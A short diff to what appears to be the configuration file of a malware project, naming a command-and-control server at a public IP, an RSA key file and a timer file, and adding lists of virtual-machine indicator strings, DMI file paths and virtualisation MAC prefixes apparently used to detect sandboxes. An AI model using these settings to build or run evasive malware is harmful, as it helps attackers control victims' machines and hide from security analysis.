@@ -11,3 +11,9 @@ timer_file_name = "timer.json"
 
 c2_server = "http://51.20.137.153:5000" # Public IP from my EC2 instance
 rsa_key = "private.pem"
+
+####################################################################################################################
+
+vm_indicators = ["virtual", "vmware", "qemu", "kvm", "xen", "microsoft", "parallels", "bhyve"]
+dmi_files = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/product_version", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/bios_vendor", "/sys/class/dmi/id/bios_version",]
+vm_mac_prefixes = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27", "00:15:5d", "00:03:ff", "52:54:00", "00:16:3e", "00:1c:42", "00:14:4f", "00:10:18",]
